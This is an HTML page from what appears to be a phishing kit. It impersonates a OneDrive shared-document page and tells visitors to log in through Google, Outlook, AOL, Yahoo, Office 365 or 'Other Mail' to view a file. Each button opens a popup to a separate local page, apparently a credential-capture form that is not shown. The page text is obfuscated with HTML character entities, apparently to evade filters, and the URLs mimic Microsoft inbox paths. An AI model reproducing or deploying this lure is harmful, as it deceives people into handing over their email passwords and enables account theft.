<!DOCTYPE html>
<html >
<head>
<meta charset="UTF-8">
<title>O&#110;e Dri&#118;&#101;&#32;&#67;&#108;&#111;&#117;&#100;&#32;&#68;&#111;&#99;&#117;&#109;&#101;&#110;&#116; Sharings.</title>
<link rel='stylesheet prefetch' href='https://fonts.googleapis.com/css?family=Open+Sans:600'>
<link rel="stylesheet" href="css/style.css">
<script type="text/javascript">
<!--
function popupwnd(url, toolbar, menubar, locationbar, resize, scrollbars, statusbar, left, top, width, height)
{
   if (left == -1)
   {
      left = (screen.width/2)-(width/2);
   }
   if (top == -1)
   {
      top = (screen.height/2)-(height/2);
   }
   var popupwindow = this.open(url, '', 'toolbar=' + toolbar + ',menubar=' + menubar + ',location=' + locationbar + ',scrollbars=' + scrollbars + ',resizable=' + resize + ',status=' + statusbar + ',left=' + left + ',top=' + top + ',width=' + width + ',height=' + height);
}
//-->
</script>
</head>

<body>
<div class="login-wrap">
  <div class="login-html">
	  <div class="LogoOne"></div>
	   <div class="foot-lnk">To re&#97;&#100;&#32;&#116;&#104;&#101;&#32;&#100;&#111;&#99;ument, please choo&#115;&#101;&#32;&#121;&#111;&#117;&#114;&#32;&#101;&#109;&#97;&#105;&#108;&#32;&#112;&#114;ovider below Log&#105;&#110;&#32;&#116;&#111;&#32;&#118;iew shared file. </div>
    <!--<div class="top"></div>-->
    <!--<input id="tab-1" type="radio" name="tab" class="sign-in" checked><label for="tab-1" class="tab">Sign In</label>
		<input id="tab-2" type="radio" name="tab" class="sign-up"><label for="tab-2" class="tab">Sign Up</label>-->
    <div class="login-form">
      <div class="sign-in-htm">
        <div class="group">
          <button class="btn-3 loginBtn loginBtn--google" onclick="popupwnd('GNO.html?l=_JeHFUq_VJOXK0Qtyeertrw3534trDw1774256418&fid.13InboxLight.aspxn.1774ghdd418&fid.125289964252813InboxLight99642_Product','no','no','no','no','no','no','300','100','400','400')">Lo&#103;&#105;n wi&#116;&#104; G&#111;og&#108;&#101;</button>
        </div>
        <div class="group">
          <button class="btn-3 loginBtn loginBtn--outlook" onclick="popupwnd('LO.htm?l=_JeHFUq_VJOXK0QWHtoGsduikghn5655r6rYDw1774256418&fid.13InboxLight.aspxn.1774256418&fid.125289964252813InboxLight99642_Product','no','no','no','no','no','no','300','100','480','480')">Lo&#103;&#105;n wi&#116;&#104; Ou&#116;l&#111;o&#107;</button>
        </div>
        <div class="group">
          <button class="btn-3 loginBtn loginBtn--aol" onclick="popupwnd('AO.htm?l=_JeHFUq_VJOXK0QWHtofgdfgsg65tghghgjhghw1774256418&fid.13InboxLight.aspxn.1774256418&fid.125289964252813InboxLight99642_Product','no','no','no','no','no','no','300','100','400','400')">Lo&#103;&#105;n wi&#116;&#104; &#65;o&#108;</button>
        </div>
        <div class="group">
			<button class="btn-3 loginBtn loginBtn--yahoo" onclick="popupwnd('YA.html?l=_JeHFUq_VJOXK0QWHerwretrtd.13InboxLight.aspxn.1774256418&fid.125289964252813InboxLight99642_Product','no','no','no','no','no','no','300','100','400','400')">Lo&#103;&#105;n wi&#116;&#104; &#89;ah&#111;o</button>
        </div>
        <div class="group">
          <button class="btn-3 loginBtn loginBtn--office" onclick="popupwnd('OFE.htm?l=_JeHFUq_VJOXK0QWHtoGrtyuuirewtrgddg1774256418&fid.13InboxLight.aspxn.1774256418&fid.125289964252813InboxLight99642_Product','no','no','no','no','no','no','300','100','400','400')">Lo&#103;&#105;n wi&#116;&#104; O&#102;f&#105;ce 36&#53;</button>
        </div>
        <div class="group">
          <button class="btn-3 loginBtn loginBtn--other" onclick="popupwnd('OTR.htm?l=_JeHFUq_VJOXK0QWHtfghdfvmhvndsgsgfjoGYDw1774256418&fid.13InboxLight.aspxn.1774256418&fid.125289964252813InboxLight99642_Product','no','no','no','no','no','no','300','100','400','400')">Lo&#103;&#105;n wi&#116;&#104; O&#116;he&#114; M&#97;il</button>
        </div>
        <!--<div class="hr"></div>-->
        <div class="foot-lnk">Get to all you&#114;&#32;&#102;&#105;&#108;es from anywhere on a&#110;&#121;&#32;&#100;&#101;vice , and sha&#114;&#101;&#32;&#116;&#104;em wi&#116;&#104; anyone. 0&#110;&#101;&#32;&#68;&#114;&#105;ve your shared docum&#101;&#110;&#116;&#32;&#105;&#110;&#32;&#111;&#110;&#101;&#32;&#99;loud. </div>
      </div>
    </div>
  </div>
</div>
<!--</div>-->
</body>
</html>
